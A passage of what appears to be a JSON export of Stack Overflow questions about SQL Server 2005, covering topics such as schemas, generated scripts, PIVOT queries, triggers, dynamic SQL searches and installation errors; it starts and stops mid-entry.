   Using cnn As New SqlConnection(conn)\n            cnn.Open()\n            Using dad As New SqlDataAdapter(strSql, cnn)\n                dad.Fill(dtb)\n            End Using\n            cnn.Close()\n        End Using\n        txtsearch.AutoCompleteMode = AutoCompleteMode.SuggestAppend\n        txtsearch.AutoCompleteSource = AutoCompleteSource.CustomSource\n        If dtb.Rows.Count &gt; 0 Then\n            Dim i As Integer = 0\n            For i = 0 To (dtb.Rows.Count - 1)\n                txtsearch.AutoCompleteCustomSource.Add(dtb.Rows(i)(\"P_FirstName\"))\n            Next\n        End If\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":24,"score":-1,"question_id":13206848,"title":"Backup and restore","body":"<p>I have created a software using Visual Studio 2008 and SQL Server 2005. In one of my forms I added two buttons, one for taking a backup and another for restore.</p>\n\n<p>Is it requires any special namespaces?</p>\n"},{"tags":["sql-server-2005","schema","theory"],"answer_count":10,"favorite_count":7,"up_vote_count":46,"down_vote_count":0,"view_count":19477,"score":46,"question_id":529142,"title":"What good are SQL Server schemas?","body":"<p>I'm no beginner to using SQL databases, and in particular SQL Server.  However, I've been primarily a SQL 2000 guy and i've always been confused by schemas in 2005+.  Yes, I know the basic definition of a schema, but what are they really used for in a typical SQL Server deployment?</p>\n\n<p>I've always just used the default schema.  Why would I want to create specialized schemas?  Why would I assign any of the built-in schemas?</p>\n\n<p>EDIT: To clarify, I guess i'm looking for the benefits of schemas.  If you're only going to use it as a security scheme, it seems like database roles already filled that.. er.. um.. role.  And using it a as a namespace sepcifier seems to have been something you could have done with ownership (dbo versus user, etc..).</p>\n\n<p>I guess what i'm getting at is, what do Schemas do that you couldn't do with owners and roles?  What are their specifc benefits?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":116,"score":2,"question_id":11858827,"title":"MS SQL Server 2008 script generation creates invalid scripts when using constraints","body":"<p>On an MS SQL Server 2008 (10.50.2811.0) Developer Edition (64-bit), running under Windows 2008 Server 2008 R2 Standard the script generation from within SQL Server Management Studio creates scripts where the same constraint is dropped multiple times. </p>\n\n<p>A simple example includes two tables, tParent and tChild, where tChild's ParentID references tParent's ID. The script (Database context menu => Tasks => Generate Scripts...) being generated (for DROP AND CREATE) looks like this:</p>\n\n<pre><code>USE [TestDb]\nGO\n/****** Object: ForeignKey [FK_tChild_tParent] Script Date: 08/08/2012 08:11:51 ******/\nALTER TABLE [dbo].[tChild] DROP CONSTRAINT [FK_tChild_tParent]\nGO\n/****** Object: Table [dbo].[tChild] Script Date: 08/08/2012 08:11:51 ******/\nALTER TABLE [dbo].[tChild] DROP CONSTRAINT [FK_tChild_tParent]\nGO\nDROP TABLE [dbo].[tChild]\nGO\n/****** Object: Table [dbo].[tParent] Script Date: 08/08/2012 08:11:52 ******/\nDROP TABLE [dbo].[tParent]\nGO\n/****** Object: Table [dbo].[tParent] Script Date: 08/08/2012 08:11:52 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nCREATE TABLE [dbo].[tParent](\n[ID] [int] IDENTITY(1,1) NOT NULL,\n[Name] [varchar](50) NOT NULL,\n[Value] [int] NOT NULL,\nCONSTRAINT [PK_tParent] PRIMARY KEY CLUSTERED \n(\n[ID] ASC\n)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO\n/****** Object: Table [dbo].[tChild] Script Date: 08/08/2012 08:11:51 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nCREATE TABLE [dbo].[tChild](\n[ID] [int] IDENTITY(1,1) NOT NULL,\n[ParentID] [int] NOT NULL,\n[Name] [varchar](50) NOT NULL,\n[Value] [int] NOT NULL,\nCONSTRAINT [PK_tChild] PRIMARY KEY CLUSTERED \n(\n[ID] ASC\n)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO\n/****** Object: ForeignKey [FK_tChild_tParent] Script Date: 08/08/2012 08:11:51 ******/\nALTER TABLE [dbo].[tChild] WITH CHECK ADD CONSTRAINT [FK_tChild_tParent] FOREIGN KEY([ParentID])\nREFERENCES [dbo].[tParent] ([ID])\nGO\nALTER TABLE [dbo].[tChild] CHECK CONSTRAINT [FK_tChild_tParent]\nGO\n</code></pre>\n\n<p>Why are there two identical lines that both try to drop the FK_tChild_tParent constraint? And why is the comment for both lines different?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":30,"score":3,"question_id":13200609,"title":"How get around the arithmetic overflow error converting expression to data type int?","body":"<p>I have the following query:</p>\n\n<pre><code>-- CTE to remove outliers, e.g. remove the fastest and slowest results\n;WITH MinMaxCTE AS \n(\n  SELECT ServerName, CONVERT(VARCHAR(10), UpdatedOn, 101) AS [Date], Version, \n    MIN(JaguarStartupTime) AS MinStartTime, MAX(JaguarStartupTime) AS MaxStartTime\n  FROM dbo.MachineConfiguration (NOLOCK)\n  WHERE DomainLogin NOT IN (SELECT DomainLogin FROM dbo.SupportGroup)\n  GROUP BY ServerName, CONVERT(VARCHAR(10), UpdatedOn, 101), Version\n)\n\nSELECT  AVG(mc.JaguarStartupTime) AS AverageTime\n    , COUNT(*) AS NumEntries\n    , mc.Version\nFROM    #Eligible mc (NOLOCK)\nJOIN MinMaxCTE cte ON mc.ServerName = cte.ServerName \n  AND CONVERT(VARCHAR(10), mc.UpdatedOn, 101) = cte.[Date] \n  AND mc.Version = cte.Version \n  AND mc.JaguarStartupTime &lt;&gt; cte.MinStartTime \n  AND mc.JaguarStartupTime &lt;&gt; cte.MaxStartTime\nGROUP BY mc.Version\nORDER BY Version DESC, AVG(mc.JaguarStartupTime) ASC\n</code></pre>\n\n<p>The definition of the #Eligible temp table is </p>\n\n<pre><code>create table #Eligible (\n    Version nvarchar(50), JaguarStartupTime int, \n    ServerName nvarchar(50), UpdatedOn datetime )\n</code></pre>\n\n<p>No matter what condition or aggregation I comment out, I always get the following error: <code>Arithmetic overflow error converting expression to data type int</code>.</p>\n\n<p>Where can I go from here?  How do I debug this further?</p>\n\n<p>EDIT: Sample data</p>\n\n<pre><code>Version JaguarStartupTime    ServerName     UpdatedOn\n6.4.6.082      16040         NewOrleansLA   2012-08-08 12:34:12.330\n6.5.1.012      40390         BatonRougeLA   2012-08-08 18:33:17.440\n6.5.1.012      48379         HonoluluHI     2012-08-09 04:42:50.453\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13195785,"title":"Is it possible for triggers not to fire?","body":"<p>On three different tables I have separate <code>INSERT</code>, <code>UPDATE</code> and <code>DELETE</code> triggers.</p>\n\n<p>I know positively that they work as expected (tried adding, deleting, updating and confirmed the changes going to log-table). However, it happens that rows are removed or added, without my log tables having any content.</p>\n\n<p>So my question is: Is it possible for instance to add a record without the enabled INSERT trigger being triggered?</p>\n\n<p>This is on SQL Server 2005.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":13194630,"title":"SQL Server 2005 : conversion failed when converting the varchar value '0.00' to data type int","body":"<p>When adding this line into my query:</p>\n\n<pre><code>convert(varchar(20), convert(varchar(20),\nsum(case when tsr.other like '%aa%' then tsr.block1 else 0 end) +\nsum(case when tsr.other like '%aa%' then tsr.block2 else 0 end) +\nsum(case when tsr.other like '%aa%' then tsr.block3 else 0 end) +\nsum(case when tsr.other like '%aa%' then tsr.block4 else 0 end)) * 450) \n</code></pre>\n\n<p>I get this error message:</p>\n\n<blockquote>\n  <p><em>Conversion failed when converting the varchar value '0.00' to data\n  type int</em></p>\n</blockquote>\n\n<p>Data in block column is days - e.g. <code>10.0</code></p>\n\n<p>Any ideas?</p>\n\n<p>i've got it fixed, it was just changing the 450 to 450.0.</p>\n\n<p>The reason for the varchars is that this is just 1 line from 1 of multiple unioned select statements. </p>\n"},{"tags":["sql-server","sql-server-2005","uniqueidentifier","uuid"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":966,"score":6,"question_id":1930917,"title":"How do I identify a blank uniqueidentifier in SQL Server 2005?","body":"<p>I'm getting a <code>uniqueidentifier</code> into a Stored Procedure that looks like this </p>\n\n<p><code>00000000-0000-0000-0000-000000000000</code>.</p>\n\n<p>This seems like a simple thing, but how can identify that this is a blank <code>uniqueidentifier</code>? </p>\n\n<p>If I get a value like this <code>DDB72E0C-FC43-4C34-A924-741445153021</code> I want to do X</p>\n\n<p>If I get a value like this <code>00000000-0000-0000-0000-000000000000</code> I do Y</p>\n\n<p>Is there a more elegant way then counting up the zeros? </p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13195243,"title":"Count of string match in all columns in SQL Server","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7766959/search-count-of-words-within-a-string-using-sql\">Search count of words within a string using SQL</a>  </p>\n</blockquote>\n\n\n\n<p>I have a table TABLE1 as follows</p>\n\n<pre>\nCol1    Col2\n1   Hai Hello Hai\n2   Hello Hai Hai Hai\n3   R R R\n4   R R R\n5   Hello Hello Hello\n</pre>\n\n<p>Now If I am searching for  a workd \"Hai\" I want the result as follows</p>\n\n<pre>\nCol1    Col2            Cout_of_Stirng_Match\n1   Hai Hello Hai       2\n2   Hello Hai Hai Hai   3\n</pre>\n\n<p>Kindly help me.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":13071003,"title":"Strange (Caching?) Issue (Bug?) with T-SQL View","body":"<p><strong>This issue was resolved by scripting the view as a create, dropping the view, and then recreating the view using the script, so obviously nothing was <em>wrong</em> with the view, per se.  However, I am very curious as to what the cause could be...</strong></p>\n\n<p>I have a created like this:</p>\n\n<pre><code>CREATE VIEW [dbo].[Employees_V]\nAS\nSELECT  cast(right(EmployeeNo,4) as int) as EmployeeID\n,*\n,cast(0 as bit) AS [IsTerritoryManager]\n,cast(0 as bit) AS [IsCoordinator]\nFROM    AD.dbo.ADEmployees_V\n</code></pre>\n\n<p>The <code>AD.dbo.ADEmployees_V</code> has a lot of different fields, but the relevant fields are <code>Status</code> and <code>ISStatus</code>, defined in the creation of the view as:</p>\n\n<pre><code>,CASE WHEN c.[Status] = 'Active' THEN 'Active' ELSE 'Terminated' END AS [Status]\n,CASE WHEN c.[Status] = 'Active' OR ad.[AccountStatus] LIKE '%Enabled%' THEN 'Active' ELSE 'Terminated' END AS [ISStatus]\n</code></pre>\n\n<p>Today, I added the <code>ISStatus</code> column to <code>AD.dbo.ADEmployees_V</code> (<code>Status</code> was there previously).</p>\n\n<p>After making that change, I did a:</p>\n\n<pre><code>SELECT * FROM [Employees_V]\n</code></pre>\n\n<p>Surprisingly, this did not return the proper results.  <code>ISStatus</code> did not appear as a column header, and instead of being populated with 0s, <code>IsTerritoryManager</code> was populated with the new <code>ISStatus</code> values!</p>\n\n<p>I am guessing that this is some sort of caching issue, but I would <em>love</em> an explanation of what is going on under the covers.  Thanks!</p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13180975,"title":"Prevent injection of html tags in SQL Server database","body":"<p>I have created a web site with asp.net 3.5 and SQL Server 2005 on the back end</p>\n\n<p>We have created admin site for updating data in the database by using secure user account.\nI working for live for some time.</p>\n\n<p>After some times we found that some specific <code>html</code> tags are getting inserted into string fields of the database.</p>\n\n<p>It seems some kind of attack </p>\n\n<p>Can any one suggest me how to prevent from that attack.</p>\n"},{"tags":["vb.net","sql-server-2005","header","infragistics","ultragrid"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3541,"score":1,"question_id":314481,"title":"Display Headers in Infragistics ULTRAGRID when no data in table","body":"<p>I am fetching data in  from an SQL table using a DataSet in VB.Net. When there is data in table, it displays the data properly in the grid, but when there is no data in the table, it only shows the UltraGrid's basic view.</p>\n\n<p>How can I display the column names of the table as headings of the UltraGrid even when there is no data in Table?</p>\n\n<hr>\n\n<p>Thanks for the reply, but I think the problem that JD is having is a bit different from mine - in my application the data got fetched properly from SQL Server. My problem is that when there is no data in the table, I want to display the columns of the table as the headings of the grid with 0 rows. This is not happening.</p>\n\n<p>It just shows a message box saying that no data is found, and the UltraGrid shows as it does by default in the application.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":6,"favorite_count":1,"up_vote_count":25,"down_vote_count":0,"view_count":38997,"score":25,"question_id":482885,"title":"How do I drop a foreign key constraint only if it exists in sql server?","body":"<p>I can drop a table if it exists using the following code but do not know how to do the same with a constraint:</p>\n\n<pre><code>IF EXISTS(SELECT 1 FROM sys.objects WHERE OBJECT_ID = OBJECT_ID(N'TableName') AND type = (N'U')) DROP TABLE TableName\ngo\n</code></pre>\n\n<p>I also add the constraint using this code:</p>\n\n<pre><code>ALTER TABLE [dbo].[TableName] \n  WITH CHECK ADD CONSTRAINT [FK_TableName_TableName2] FOREIGN KEY([FK_Name])\n    REFERENCES [dbo].[TableName2] ([ID])\ngo\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13185517,"title":"logging of emails","body":"<p>Is it possible in sql server, to log the emails in the table sent but not actually sent to the reciepents.</p>\n\n<p>i.e I can see the emails details in the log table but the emails will not be sent.</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures","ssis","parameters"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":22788,"score":5,"question_id":745207,"title":"How do you call a Stored Procedure in SSIS?","body":"<p>I am trying to create an SSIS package that queries data from a table, and calls a stored procedure in another database with each row.</p>\n\n<p>In my old DTS package, I was doing this:</p>\n\n<pre><code>EXEC myStoredProcedure ?, ?, ?\n</code></pre>\n\n<p>...and then I mapped the parameters.  However, in SSIS, I can't figure out how to make this work.</p>\n\n<p>I have a Data Flow task, which first runs a query for the data.  It passes the data to an OLE DB Destination.  I set the Data access mode to \"SQL command\", but when I try to put in the SQL above, I get \"Invalid Parameter Count\" when it parses the SQL.  I can't get to the Mappings screen.  Any ideas?</p>\n"},{"tags":["sql","tsql","sql-server-2005","pivot","pivot-without-aggregate"],"answer_count":5,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":245,"score":5,"question_id":12221037,"title":"How can I query row data as columns?","body":"<p>I'm sure I'm missing something here.</p>\n\n<p>I have a dataset like this:</p>\n\n<pre>\nFK    RowNumber    Value    Type    Status\n1     1            aaaaa    A       New\n1     2            bbbbb    B       Good\n1     3            ccccc    A       Bad\n1     4            ddddd    C       Good\n1     5            eeeee    B       Good\n2     1            fffff    C       Bad\n2     2            ggggg    A       New\n2     3            hhhhh    C       Bad\n3     1            iiiii    A       Good\n3     2            jjjjj    A       Good\n</pre> \n\n<p>I'd like to query the top 3 results and Pivot them as columns, so the end result set looks like this:</p>\n\n<pre>\nFK    Value1    Type1    Status1    Value2    Type2    Status2    Value3    Type3    Status3\n1     aaaaa     A        New        bbbbb     B        Good       ccccc     A        Bad\n2     fffff     C        Bad        ggggg     A        New        hhhhh     C        Bad\n3     iiiii     A        Good       jjjjj     A        Good\n\n</pre>\n\n<p>How can I accomplish this in SQL Server 2005? </p>\n\n<p>I have been attempting this using <a href=\"http://msdn.microsoft.com/en-us/library/ms177410%28SQL.105%29.aspx\" rel=\"nofollow\">PIVOT</a>, but I am still very unfamiliar with that keyword and cannot get it to work the way I want.</p>\n\n<pre><code>SELECT * --Id, [1], [2], [3]\nFROM\n(\n    SELECT Id, Value, Type, Status\n    , ROW_NUMBER() OVER (PARTITION BY Id ORDER Status, Type) as [RowNumber]\n    FROM MyTable\n) as T\nPIVOT\n(\n    -- I know this section doesn't work. I'm still trying to figure out PIVOT\n    MAX(T.Value) FOR RowNumber IN ([1], [2], [3]),\n    MAX(T.Type) FOR RowNumber IN ([1], [2], [3]),\n    MAX(T.Status) FOR RowNumber IN ([1], [2], [3])\n) AS PivotTable;\n</code></pre>\n\n<p>My actual data set is a bit more complex than this, and I need the top 10 records, not the top 3, so I don't want to simply do <code>CASE WHEN RowNumber = X THEN...</code> for each one.</p>\n\n<p><strong>Update</strong></p>\n\n<p>I tested all the answers below, and found most of them seem about the same with no apparent performance difference in smaller data sets (around 3k records), however there was a slight difference when running the queries against larger data sets. </p>\n\n<p>Here are the results of my tests using 80,000 records and querying for 5 columns in the top 10 rows, so my end result set was 50 columns + the <code>Id</code> column. I'd suggest you test them on your own to decide which one works best for you and your environment.</p>\n\n<ul>\n<li><p><a href=\"http://stackoverflow.com/a/12221580/302677\">bluefoot's answer</a> of unpivoting and re-pivoting the data averaged the fastest at about 12 seconds. I also liked this answer because I found it easiest to read and maintain.</p></li>\n<li><p><a href=\"http://stackoverflow.com/a/12221510/302677\">Aaron's answer</a> and <a href=\"http://stackoverflow.com/a/12221623/302677\">koderoid's answer</a> both suggest using a <code>MAX(CASE WHEN RowNumber = X THEN ...)</code>, and was close behind averaging at around 13 seconds.</p></li>\n<li><p><a href=\"http://stackoverflow.com/a/12221475/302677\">Rodney's answer</a> of using multiple <code>PIVOT</code> statements averaged around 16 seconds, although it might be faster with fewer PIVOT statements (my tests had 5).</p></li>\n<li><p>And the first half of <a href=\"http://stackoverflow.com/a/12221510/302677\">Aaron's answer</a> that suggested using a CTE and <code>OUTER APPLY</code> was the slowest. I don't know how long it would take to run because I cancelled it after 2 minutes, and that was with around 3k records, 3 rows, and 3 columns instead of 80k records, 10 rows, and 5 columns.</p></li>\n</ul>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13184312,"title":"Meaning of Msg 3456, Level 16 Sql Server message","body":"<p>What's the meaning of the below error:</p>\n\n<blockquote>\n  <p><em>Could not redo log record (13711624:118626:157), for transaction ID\n  (2:-271513189), on page (3:57660275), database 'Manish' (database ID\n  5). Page: LSN = (13711624:118626:151), type = 2. Log: OpCode = 2,\n  context 3, PrevPageLSN: (13711624:118626:154). Restore from a backup\n  of the database, or repair the database.</em></p>\n  \n  <p><em>Msg 3013, Level 16, State 1, Line 1</em></p>\n</blockquote>\n\n<p>I have some questions:</p>\n\n<ol>\n<li>page (3:57660275) ==> Means fileid=3 and pageid=57660275 or page 3 </li>\n<li>Meaning of log record  (13711624:118626:157)</li>\n<li>Meaning of transaction ID (2:-271513189) ==> is this distributed transaction on fileid=2?</li>\n</ol>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":13180231,"title":"Migrating DB from SQL 2005 Enterprise to SQL 2008 Standard","body":"<p>I'm attemtping to migrate a DB from SQL 2005 Enterprise to SQL 2008 Standard.  I've run into an issue because there is a Partition Function defined in the DB of the Enterprise edition.  I know Standard edtiions do not support Partition Functions. Upgrading the version of SQL im migrating to Enterprise isn't an option.</p>\n\n<p>I'm looking for a way to remove the partition function without causing any negative effects to the DB currently so I can migrate it to the 2008 Standard Edition.</p>\n\n<p>Any help would be greatly appreciated. Thanks!</p>\n\n<p>MOVED to dba.stackexchange.com. </p>\n"},{"tags":["sql","sql-server-2005","stored-procedures","dll","64bit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13178122,"title":"Run 32 bit dll in 64 bit SQL SERVER","body":"<p>I have a 32 bit dll which is called from a stored procedure. It works fine with 32 bit sql server but now when i call that procedure from 64 bit sql server 2005 developer edition it gives an exception. </p>\n\n<p><strong>How can I make a 32 bit dll to run from 64 bit sql server?</strong> </p>\n\n<p>Please note I do not have the source code for the dll, therefore recompiling won't be a option  .</p>\n"},{"tags":["mysql","sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":54,"score":4,"question_id":13177765,"title":"Regarding get automatic columns in sql`","body":"<p>I have basically 50 fields in a table and I want to select this fields from table on a regular basis.</p>\n\n<p><strong>Problem is</strong>: I have to write all this 50 fields manually.</p>\n\n<p>Is there any shortcut in intellisence or any other tool where I can get all fields. automatically by pressing tool.</p>\n\n<p>Also guys if anyone knows here extra addons on sql..then please post it here.</p>\n"},{"tags":["sql-server","database","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13174627,"title":"Searching some text from SQL-Server DB","body":"<p>This Query can search any string value (table name, table data etc) from all the tables/views of any SQL-Server DB, when you will place any string at \"<strong>your text here</strong>\" it will search your given string from all the tables/views exist in that DB,    </p>\n\n<pre><code>DECLARE @SearchStr nvarchar(100) \n    SET @SearchStr = 'your text here'\n\nDECLARE @Results TABLE(ColumnName nvarchar(370), ColumnValue nvarchar(3630))\n\nSET NOCOUNT ON\n\nDECLARE @TableName nvarchar(256), @ColumnName nvarchar(128), @SearchStr2 nvarchar(110)\nSET  @TableName = ''\nSET @SearchStr2 = QUOTENAME('%' + @SearchStr + '%','''')\n\nWHILE @TableName IS NOT NULL\nBEGIN\n    SET @ColumnName = ''\n    SET @TableName = \n    (\n        SELECT MIN(QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME))\n        FROM    INFORMATION_SCHEMA.TABLES\n        WHERE       TABLE_TYPE = 'BASE TABLE'\n            AND QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME) &gt; @TableName\n            AND OBJECTPROPERTY(\n                    OBJECT_ID(\n                        QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME)\n                         ), 'IsMSShipped'\n                           ) = 0\n    )\n\n    WHILE (@TableName IS NOT NULL) AND (@ColumnName IS NOT NULL)\n    BEGIN\n        SET @ColumnName =\n        (\n            SELECT MIN(QUOTENAME(COLUMN_NAME))\n            FROM    INFORMATION_SCHEMA.COLUMNS\n            WHERE       TABLE_SCHEMA    = PARSENAME(@TableName, 2)\n                AND TABLE_NAME  = PARSENAME(@TableName, 1)\n                AND DATA_TYPE IN ('char', 'varchar', 'nchar', 'nvarchar')\n                AND QUOTENAME(COLUMN_NAME) &gt; @ColumnName\n        )\n\n        IF @ColumnName IS NOT NULL\n        BEGIN\n            INSERT INTO @Results\n            EXEC\n            (\n                'SELECT ''' + @TableName + '.' + @ColumnName + ''', LEFT(' + @ColumnName + ', 3630) \n                FROM ' + @TableName + ' (NOLOCK) ' +\n                ' WHERE ' + @ColumnName + ' LIKE ' + @SearchStr2\n            )\n        END\n    END \nEND\n\nSELECT ColumnName, ColumnValue FROM @Results\n</code></pre>\n\n<p><strong>But i like to search</strong> given string in the <code>procedures/functions/triggers</code> as well is there any query exist for SQL server 2005. As this query does not search in these areas.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":13173372,"title":"How to select one record at a time without using cursor?","body":"<p>I have two tables in SQL SERVER.</p>\n\n<p>DBO.VitalPatientDetails=></p>\n\n<p>| PatientDetailsId | PatientId | PatientName | UnitName | BedName | PatientDOB | LastAlarmReceivedAt |</p>\n\n<p>DBO.VitalAlarmDetails=></p>\n\n<p>| Id | PatientDetailsId (Refers VitalPatientDetails.PatientDetailsId) | VitalGenerationTime | FileName | </p>\n\n<p>I need to retrive all fields of DBO.VitalAlarmDetails grouped by PatientDetailsId ordered by VitalGenerationTime in ascending order.\nI have written cursor for this as below and it is returning multiple result sets. I need to get it in single set without using cursor. I just want to know whether I can do this without cursor.</p>\n\n<pre><code>DECLARE @PatientDetailsId BIGINT\nDECLARE @getAlarmDetails CURSOR\n\nSET @getAlarmDetails = CURSOR FOR SELECT PatientDetailsId FROM VitalPatientDetails\n\nOPEN @getAlarmDetails\n    FETCH NEXT FROM @getAlarmDetails INTO @PatientDetailsId\n\n    WHILE @@FETCH_STATUS = 0\n    BEGIN\n        SELECT * FROM VitalAlarmDetails\n        WHERE PatientDetailsId = @PatientDetailsId\n        ORDER BY VitalGenerationTime ASC\n\n        FETCH NEXT FROM @getAlarmDetails INTO @PatientDetailsId\n    END\nCLOSE @getAlarmDetails\nDEALLOCATE @getAlarmDetails\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","command-line","installation"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3437,"score":1,"question_id":696846,"title":"sql server 2005 command line install error ADD_LOCAL property already installed","body":"<p>I have a silent installation of SQL Server 2005 that works great when installing SQL Server on a machine that does not have it already installed.  I use the following parameters when I perform the installation:</p>\n\n<pre><code>#define SQL_SILENT                    \"/passive /qb\"\n#define SQL_USERNAME                  \"username=MyUserName\"\n#define SQL_COMPANYNAME               \"companyname=MyCompanyName\"\n#define SQL_ADDLOCAL                  \"ADDLOCAL=SQL_Engine\"\n#define SQL_UPGRADE                   \"\"\n#define SQL_DISABLENETWORKPROTOCOLS   \"disablenetworkprotocols=0\"\n#define SQL_INSTANCENAME              \"instancename=MYSQLINSTANCE\"\n#define SQL_SQLAUTOSTART              \"SQLAUTOSTART=1\"\n#define SQL_SECURITYMODE              \"SECURITYMODE=SQL\"\n#define SQL_SAPWD                     \"SAPWD=StrongPassword\"\n#define SQL_SQLACCOUNT                \"SQLACCOUNT=\"\"\"\"\"\n#define SQL_SQLPASSWORD               \"SQLPASSWORD=\"\"\"\"\"\n</code></pre>\n\n<p>It installs the instance of SQL Server Express without a problem.  However, when I attempt to install SQL Server on a machine that already has another instance with components I get the following error:</p>\n\n<p>*\"A component that you have specified in the ADD_LOCAL property is already installed.  To upgrade the existing component, refer to the template.ini and set the UPGRADE property to the name of the component.\"*</p>\n\n<p>I have also tried using the UPGRADE method as per the error message </p>\n\n<pre><code>#define SQL_UPGRADE       \"UPGRADE=SQL_Engine INSTANCENAME=MYSQLINSTANCE\"\n</code></pre>\n\n<p>but get the following error:</p>\n\n<p><em>\"SQL Server Setup cannot perform the upgrade because the component is not installed on the computer.  To proceed, verify the component to be upgraded in currently installed, and that the component to be upgraded is specified in the ADDLOCAL property.\"</em></p>\n\n<p>Does anyone have any suggestions?</p>\n\n<p>Thank you</p>\n"},{"tags":["sql-server-2005","unicode","internationalization"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":1845451,"title":"How can I insert Armenian string to SQL Server database","body":"<p>How can I insert Armenian string to SQL Server database.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":9,"favorite_count":2,"up_vote_count":6,"down_vote_count":1,"view_count":19020,"score":5,"question_id":358542,"title":"How to find fifth highest salary in a single query in SQL Server","body":"<p>How to find fifth highest salary in a single query in SQL Server</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","login"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":13168175,"title":"SQL Script to Create Auto-Expiring Login","body":"<p>How can I script the creation of a new SQL Login (whether by Windows\nAuthentication or with SQL password) and have it automatically expire after some\ntime, e.g. 8 hours, 24 hours</p>\n\n<p>I've tried searching here in stackoverflow but I haven't found a solution. If you guys know of one that exists here, please let me know too. Thank you.</p>\n\n<p>I am using SQL Server 2005 and 2008</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":34,"score":4,"question_id":13168965,"title":"Group by query is not returning what I expected","body":"<p>I am attempting to find all records that have the same <code>groupCol</code> but more than one non 0 <code>infoCol</code>. Here is a complete example of what I am trying to do.</p>\n\n<pre><code>CREATE TABLE #t\n    (\n    groupCol varchar(14) NOT NULL,\n    infoCol int NOT NULL,\n    indexCol int NOT NULL IDENTITY (1, 1)\n    )\nGO\n\ninsert into #t (groupCol, infoCol) \nvalues ('NoRows',1),      ('NoRows',1),      ('NoRows',1),       --Not in output due to having only 1 disticnt infoCol\n       ('TwoResults',1),  ('TwoResults',1),  ('TwoResults',2),   --In the output with \"'TwoResults', 2\"\n       ('ThreeResults',1),('ThreeResults',2),('ThreeResults',3), --In the output with \"'ThreeResults', 3\"\n       ('ExcludedZero',1),('ExcludedZero',1),('ExcludedZero',0)  --Not in the output due to 0 being excluded for finding distinct infoCol's\n       ('TwoAndZero',1),  ('TwoAndZero',2),  ('TwoAndZero',0)    --In the output but returns 2 not 3.\n\nselect * from #t\n\nselect groupCol, count(groupCol) as distinctInfoCol \nfrom #t \nwhere infoCol &lt;&gt; 0\ngroup by groupCol, infoCol\nhaving count(groupCol) &gt; 1\n\ndrop table #t\n</code></pre>\n\n<p>However the result from my query is </p>\n\n<pre>\ngroupCol       distinctInfoCol\n-------------- 